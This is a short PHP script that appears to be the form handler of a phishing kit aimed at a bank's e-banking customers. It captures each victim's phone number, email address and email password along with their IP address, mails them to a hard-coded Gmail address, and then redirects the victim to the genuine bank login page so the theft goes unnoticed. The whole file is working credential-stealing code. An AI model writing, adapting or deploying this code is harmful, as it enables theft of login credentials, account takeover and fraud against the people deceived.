<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------News-----------------------\n";
$message .= "Phone Number: ".$_POST['phone']."\n";
$message .= "E-mail: ".$_POST['email']."\n";
$message .= "E-mail pass: ".$_POST['passwordemail']."\n";
$message .= "IP: ".$ip."\n";
$message .= "------------------------\n";


$recipient = "pakpaki1989@gmail.com";
$subject = "$ip";
 mail("$to", " Login", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://ebank.dibpak.com/ebank/");

	   } 

?>